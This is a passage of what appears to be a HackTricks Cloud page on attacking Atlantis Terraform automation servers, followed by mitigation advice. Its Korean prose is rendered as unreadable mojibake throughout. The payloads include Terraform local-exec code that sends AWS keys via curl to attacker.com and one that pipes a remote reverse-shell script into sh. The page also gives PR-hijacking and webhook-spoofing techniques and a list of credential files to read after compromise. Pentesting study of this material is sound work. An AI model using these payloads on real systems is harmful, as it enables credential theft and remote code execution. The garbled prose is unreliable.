- ê¸°ë³¸ì ìœ¼ë¡œ [**Gitbot í† í°ì„ ì•…ìš©í•˜ì—¬ ì´ ë³´í˜¸ë¥¼ ìš°íšŒ**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•…ì„± Terraform íŒŒì¼ì—ì„œ **`terraform apply`ë¥¼ ì‹¤í–‰í•˜ë©´ì„œ** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤**.\
ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œê°€ `main.tf` íŒŒì¼ì— í¬í•¨ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ë©´ ë©ë‹ˆë‹¤:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**ì´ì „ ê¸°ìˆ ì˜ ì œì•ˆì„ ë”°ë¼** ì´ ê³µê²©ì„ **ë³´ë‹¤ ì€ë°€í•˜ê²Œ** ìˆ˜í–‰í•˜ì‹­ì‹œì˜¤.

### Terraform Param Injection

`atlantis plan` ë˜ëŠ” `atlantis apply`ë¥¼ ì‹¤í–‰í•  ë•Œ terraformì´ í•„ìš”ë¡œ í•˜ëŠ” ìƒí™©ì—ì„œ, atlantisì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì£¼ì„ì„ ë‹¬ì•„ terraformì— ëª…ë ¹ì„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
í™˜ê²½ ë³€ìˆ˜ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆëŠ” ê²ƒ ì¤‘ ì¼ë¶€ëŠ” ì¼ë¶€ ë³´í˜¸ë¥¼ ìš°íšŒí•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)ì—ì„œ Terraform í™˜ê²½ ë³€ìˆ˜ë¥¼ í™•ì¸í•˜ì„¸ìš”.

### ì‚¬ìš©ì ì •ì˜ ì›Œí¬í”Œë¡œìš°

`atlantis.yaml` íŒŒì¼ì— ì§€ì •ëœ **ì•…ì˜ì ì¸ ì‚¬ìš©ì ì •ì˜ ë¹Œë“œ ëª…ë ¹ì–´**ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. AtlantisëŠ” í’€ ë¦¬í€˜ìŠ¤íŠ¸ ë¸Œëœì¹˜ì˜ `atlantis.yaml` íŒŒì¼ì„ ì‚¬ìš©í•˜ë©° `master`ì˜ ê²ƒì€ **ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.\
ì´ ê°€ëŠ¥ì„±ì€ ì´ì „ ì„¹ì…˜ì—ì„œ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤:

{% hint style="danger" %}
ë§Œì•½ [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allow_custom_workflows`ê°€ **True**ë¡œ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, ê° ì €ì¥ì†Œì˜ **`atlantis.yaml`** íŒŒì¼ì— ì›Œí¬í”Œë¡œìš°ë¥¼ **ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ì‚¬ìš©ìê°€ ì‚¬ìš©í•  **ì›Œí¬í”Œë¡œìš°ë¥¼ ì¬ì •ì˜**í•˜ê¸° ìœ„í•´ **`allowed_overrides`**ê°€ ë˜í•œ **`workflow`**ë¥¼ ì§€ì •í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ **í•´ë‹¹ ì €ì¥ì†Œì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ Atlantis ì„œë²„ì—ì„œ RCEë¥¼ ì œê³µ**í•  ê²ƒì…ë‹ˆë‹¤.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### ìš°íšŒ ê³„íš/ì ìš© ë³´í˜¸

ë§Œì•½ [**ì„œë²„ ì¸¡ êµ¬ì„±**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) í”Œë˜ê·¸ `allowed_overrides` _ì—_ `apply_requirements`ê°€ êµ¬ì„±ë˜ì–´ ìˆë‹¤ë©´, í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ê°€ **ê³„íš/ì ìš© ë³´í˜¸ë¥¼ ìš°íšŒí•˜ì—¬ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

ë§Œì•½ ëˆ„êµ°ê°€ê°€ **ìœ íš¨í•œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì— `atlantis plan/apply` ëŒ“ê¸€ì„ ë‚¨ê¸°ë©´**, ì›í•˜ì§€ ì•ŠëŠ” ìƒí™©ì—ì„œ terraformì´ ì‹¤í–‰ë  ê²ƒì…ë‹ˆë‹¤.

ê²Œë‹¤ê°€, **ë¸Œëœì¹˜ ë³´í˜¸**ì— **ìƒˆë¡œìš´ ì»¤ë°‹ì´ í‘¸ì‹œë  ë•Œë§ˆë‹¤ ëª¨ë“  PRì„ **ì¬í‰ê°€**í•˜ë„ë¡ êµ¬ì„±í•˜ì§€ ì•Šì€ ê²½ìš°, ëˆ„êµ°ê°€ê°€ terraform êµ¬ì„±ì— **ì•…ì„± êµ¬ì„±**(ì´ì „ ì‹œë‚˜ë¦¬ì˜¤ í™•ì¸)ì„ ì‘ì„±í•˜ê³  `atlantis plan/apply`ë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ Github ë¸Œëœì¹˜ ë³´í˜¸ ì„¤ì •ì…ë‹ˆë‹¤:

![](<../.gitbook/assets/image (216).png>)

### Webhook Secret

ë§Œì•½ **ì›¹í›… ì‹œí¬ë¦¿ì„ í›”ì¹˜ê²Œ ë˜ê±°ë‚˜ ì‚¬ìš© ì¤‘ì¸ ì›¹í›… ì‹œí¬ë¦¿ì´ ì—†ëŠ” ê²½ìš°**, Atlantis ì›¹í›…ì„ í˜¸ì¶œí•˜ê³  **ì§ì ‘ atlantis ëª…ë ¹ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Bitbucket

Bitbucket CloudëŠ” **ì›¹í›… ì‹œí¬ë¦¿ì„ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ì´ëŠ” ê³µê²©ìê°€ Bitbucketì—ì„œ ìš”ì²­ì„ ìœ„ì¥í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì˜¤ì§ Bitbucket IPë§Œ í—ˆìš©í•˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.

* ì´ëŠ” **ê³µê²©ì**ê°€ Bitbucketì—ì„œ ì˜¨ ê²ƒì²˜ëŸ¼ ë³´ì´ëŠ” **Atlantisì— ê°€ì§œ ìš”ì²­**ì„ ë§Œë“¤ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
* ë§Œì•½ `--repo-allowlist`ë¥¼ ì§€ì •í•˜ê³  ìˆë‹¤ë©´, ê·¸ë“¤ì€ í•´ë‹¹ ë¦¬í¬ì§€í† ë¦¬ì— ê´€í•œ ê°€ì§œ ìš”ì²­ë§Œ ë§Œë“¤ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ê°€ì¥ í° í”¼í•´ëŠ” ìì‹ ì˜ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ plan/applyë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
* ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ [Bitbucketì˜ IP ì£¼ì†Œ](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)ë¥¼ í—ˆìš©ëª©ë¡ì— ì¶”ê°€í•˜ì„¸ìš” (Outbound IPv4 ì£¼ì†Œ ì°¸ì¡°).

## Post-Exploitation

ë§Œì•½ ì„œë²„ì— ì•¡ì„¸ìŠ¤ë¥¼ ì–»ì—ˆê±°ë‚˜ ì ì–´ë„ LFIë¥¼ ì–»ì—ˆë‹¤ë©´ ë‹¤ìŒì„ ì½ì–´ë³´ëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤:

* `/home/atlantis/.git-credentials` VCS ì•¡ì„¸ìŠ¤ ìê²© ì¦ëª… í¬í•¨
* `/atlantis-data/atlantis.db` ë” ë§ì€ ì •ë³´ê°€ í¬í•¨ëœ VCS ì•¡ì„¸ìŠ¤ ìê²© ì¦ëª… í¬í•¨
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform ìƒíƒœ íŒŒì¼
* ì˜ˆ: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` í™˜ê²½ ë³€ìˆ˜
* `/proc/[2-20]/cmdline` `atlantis server`ì˜ ëª…ë ¹ì¤„ (ë¯¼ê°í•œ ë°ì´í„° í¬í•¨ ê°€ëŠ¥)

## Mitigations

### ê³µê°œ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš” <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

ëˆ„êµ¬ë‚˜ ê³µê°œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì— ëŒ“ê¸€ì„ ë‚¨ê¸¸ ìˆ˜ ìˆê¸° ë•Œë¬¸ì—, ëª¨ë“  ë³´ì•ˆ ì™„í™” ì¡°ì¹˜ê°€ ê°€ëŠ¥í•˜ë”ë¼ë„, ë³´ì•ˆ ì„¤ì •ì„ ì ì ˆí•˜ê²Œ êµ¬ì„±í•˜ì§€ ì•Šì€ ìƒíƒœì—ì„œ ê³µê°œ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ Atlantisë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì€ ì—¬ì „íˆ ìœ„í—˜í•©ë‹ˆë‹¤.

### `--allow-fork-prs` ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš” <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

ê¶Œì¥ë˜ì§€ ì•ŠëŠ” ê³µê°œ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ `--allow-fork-prs`ë¥¼ ì„¤ì •í•˜ì§€ ë§ˆì„¸ìš” (ê¸°ë³¸ê°’ì€ false) - ëˆ„êµ¬ë‚˜ ìì‹ ì˜ í¬í¬ì—ì„œ ë‹¹ì‹ ì˜ ë¦¬í¬ì§€í† ë¦¬ë¡œ í’€ ë¦¬í€˜ìŠ¤íŠ¸ë¥¼ ì—´ ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

AtlantisëŠ” `--repo-allowlist` í”Œë˜ê·¸ë¥¼ í†µí•´ ì›¹í›…ì„ ìˆ˜ë½í•  ë¦¬í¬ì§€í† ë¦¬ì˜ ëª©ë¡ì„ ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

* íŠ¹ì • ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* ì „ì²´ ì¡°ì§: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise ì„¤ì¹˜ì˜ ëª¨ë“  ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=github.yourcompany.com/*`
* ëª¨ë“  ë¦¬í¬ì§€í† ë¦¬: `--repo-allowlist=*`. ì›¹í›… ì‹œí¬ë¦¿ì„ ì„¤ì •í•˜ì§€ ì•Šì€ ê²½ìš°ì—ëŠ” ìœ„í—˜í•˜ë©°, ë³´í˜¸ëœ ë„¤íŠ¸ì›Œí¬ì—ì„œ ì‚¬ìš©í•  ë•Œ ìœ ìš©í•©ë‹ˆë‹¤.

ì´ í”Œë˜ê·¸ëŠ” Atlantis ì„¤ì¹˜ê°€ ì œì–´í•˜ì§€ ì•ŠëŠ” ë¦¬í¬ì§€í† ë¦¬ì™€ í•¨ê»˜ ì‚¬ìš©ë˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ `atlantis server --help`ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

### Terraform Planning ë³´í˜¸ <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

ì•…ì„± Terraform ì½”ë“œë¥¼ ì œì¶œí•˜ëŠ” ê³µê²©ìê°€ ë‹¹ì‹ ì˜ ìœ„í˜‘ ëª¨ë¸ì— ìˆëŠ” ê²½ìš°, `terraform apply` ìŠ¹ì¸ë§Œìœ¼ë¡œ ì¶©ë¶„í•˜ì§€ ì•ŠìŒì„ ì¸ì‹í•´ì•¼ í•©ë‹ˆë‹¤. [`external` ë°ì´í„° ì†ŒìŠ¤](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ì•…ì„± í”„ë¡œë°”ì´ë”ë¥¼ ì§€ì •í•˜ì—¬ `terraform plan`ì—ì„œ ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì½”ë“œëŠ” ê·¸ëŸ° ë‹¤ìŒ ê·€í•˜ì˜ ìê²© ì¦ëª…ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. Atlantis ì´ë¯¸ì§€ì— í”„ë¡œë°”ì´ë”ë¥¼ í¬í•¨í•˜ê³  í”„ë¡œë•ì…˜ì—ì„œ egressë¥¼ ê±°ë¶€í•©ë‹ˆë‹¤.
2. ë‚´ë¶€ì ìœ¼ë¡œ í”„ë¡œë°”ì´ë” ë ˆì§€ìŠ¤íŠ¸ë¦¬ í”„ë¡œí† ì½œì„ êµ¬í˜„í•˜ê³  ê³µê°œ egressë¥¼ ê±°ë¶€í•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì“°ê¸° ì•¡ì„¸ìŠ¤ë¥¼ ì œì–´í•©ë‹ˆë‹¤.
3. [ì„œë²„ ì¸¡ ë¦¬í¬ì§€í† ë¦¬ êµ¬ì„±](https://www.runatlantis.io/docs/server-side-repo-config.html)ì˜ `plan` ë‹¨ê³„ë¥¼ ìˆ˜ì •í•˜ì—¬ ê¸ˆì§€ëœ í”„ë¡œë°”ì´ë”ë‚˜ ë°ì´í„° ì†ŒìŠ¤ ì‚¬ìš© ë˜ëŠ” í—ˆìš©ë˜ì§€ ì•Šì€ ì‚¬ìš©ìì˜ PRì— ëŒ€í•œ ìœ íš¨ì„±ì„ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì— ì¶”ê°€ ê²€ì¦ì„ ì¶”ê°€í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `plan`ì„ ê³„ì†í•˜ê¸° ì „ì— PRì— "ì¢‹ì•„ìš”"ë¥¼ ìš”êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì— Conftestë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì›¹í›… ì‹œí¬ë¦¿ <a href="#webhook-secrets" id="webhook-secrets"></a>

AtlantisëŠ” `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ ì„¤ì •ëœ ì›¹í›… ì‹œí¬ë¦¿ìœ¼ë¡œ ì‹¤í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. `--repo-allowlist` í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆë”ë¼ë„, ì›¹í›… ì‹œí¬ë¦¿ì´ ì—†ìœ¼ë©´, ê³µê²©ìê°€ í—ˆìš©ëœ ë¦¬í¬ì§€í† ë¦¬ë¡œ ìœ„ì¥í•˜ì—¬ Atlantisì— ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›¹í›… ì‹œí¬ë¦¿ì€ ì›¹í›… ìš”ì²­ì´ ì‹¤ì œë¡œ ê·€í•˜ì˜ VCS ì œê³µì—…ì²´ (GitHub ë˜ëŠ” GitLab)ì—ì„œ ì˜¤ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

Azure DevOpsë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, ì›¹í›… ì‹œí¬ë¦¿ ëŒ€ì‹  ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ê³¼ ì•”í˜¸ë¥¼ ì¶”ê°€í•˜ì„¸ìš”.

### Azure DevOps ê¸°ë³¸ ì¸ì¦ <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOpsëŠ” ëª¨ë“  ì›¹í›… ì´ë²¤íŠ¸ì—ì„œ ê¸°ë³¸ ì¸ì¦ í—¤ë”ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì›¹í›… ìœ„ì¹˜ì— HTTPS URLì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

ì›¹í›… ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ê³  ìˆì§€ë§Œ íŠ¸ë˜í”½ì´ HTTPë¥¼ í†µí•´ ì „ì†¡ë˜ëŠ” ê²½ìš° ì›¹í›… ì‹œí¬ë¦¿ì´ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `--ssl-cert-file` ë° `--ssl-key-file` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ SSL/HTTPSë¥¼ í™œì„±í™”í•˜ì„¸ìš”.

### Atlantis ì›¹ ì„œë²„ì—ì„œ ì¸ì¦ í™œì„±í™” <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

ì›¹ ì„œë¹„ìŠ¤ì—ì„œ ì¸ì¦ì„ í™œì„±í™”í•˜ëŠ” ê²ƒì´ ë§¤ìš° ê¶Œì¥ë©ë‹ˆë‹¤. `--web-basic-auth=true`ë¥¼ ì‚¬ìš©í•˜ì—¬ BasicAuthë¥¼ í™œì„±í™”í•˜ê³  `--web-username=yourUsername` ë° `--web-password=yourPassword` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì´ë¦„ê³¼ ì•”í˜¸ë¥¼ ì„¤ì •í•˜ì„¸ìš”.

í™˜ê²½ ë³€ìˆ˜ë¡œë„ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `ATLANTIS_WEB_BASIC_AUTH=true`, `ATLANTIS_WEB_USERNAME=yourUsername`, `ATLANTIS_WEB_PASSWORD=yourPassword`.

## References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
